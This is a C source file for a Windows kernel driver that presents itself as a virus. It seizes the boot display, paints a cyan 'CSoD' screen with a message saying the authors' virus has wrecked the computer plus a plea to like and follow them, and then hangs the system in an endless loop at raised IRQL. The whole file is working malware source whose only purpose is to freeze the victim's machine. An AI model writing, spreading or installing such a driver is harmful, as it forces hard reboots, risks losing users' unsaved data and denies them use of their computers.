#include "Includes.h"
#include "BOOTVID.h"

#define _CSoD_COLORFUL_SCREEN 0

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	NTSTATUS ntStatus = STATUS_SUCCESS;

	KIRQL Irql = KeRaiseIrqlToDpcLevel();

	if (InbvIsBootDriverInstalled())
	{
		InbvAcquireDisplayOwnership();
		InbvResetDisplay();

#if _CSoD_COLORFUL_SCREEN
		USHORT LastWidth = 0,
			LastHeight = 0;

		for (USHORT Width = 0; Width < SCREEN_WIDTH; Width++)
		{
			for (USHORT Height = 0; Height < SCREEN_HEIGHT; Height++)
			{
				InbvSolidColorFill(LastWidth, LastHeight, Width, Height, BV_MAX_COLORS - ((Width + Height) % BV_MAX_COLORS));

				LastHeight = Height;
			}

			LastWidth = Width;
		}
#else
		InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_CYAN);
#endif

		InbvSetTextColor(BV_COLOR_WHITE);
		InbvInstallDisplayStringFilter(NULL);
		InbvEnableDisplayString(TRUE);
		InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
	}

	CHAR Text1[] = "Virus by Mitsuha & gt428 & TSK fxxked your computer so you got a strange CSoD.";
	CHAR Text2[] = "Please SANLIAN TOUBI GUANZHU!";

	for (USHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT / 2; j++)
	{
		for (USHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; i++)
			InbvDisplayString((PUCHAR)" ");
		InbvDisplayString((PUCHAR)Text1);
		InbvDisplayString((PUCHAR)"\r\n");

		for (USHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text2) + 1) / 2; i++)
			InbvDisplayString((PUCHAR)" ");
		InbvDisplayString((PUCHAR)Text2);
		InbvDisplayString((PUCHAR)"\r\n");
	}

	while (TRUE)
		;

	KeLowerIrql(Irql);

	return ntStatus;
}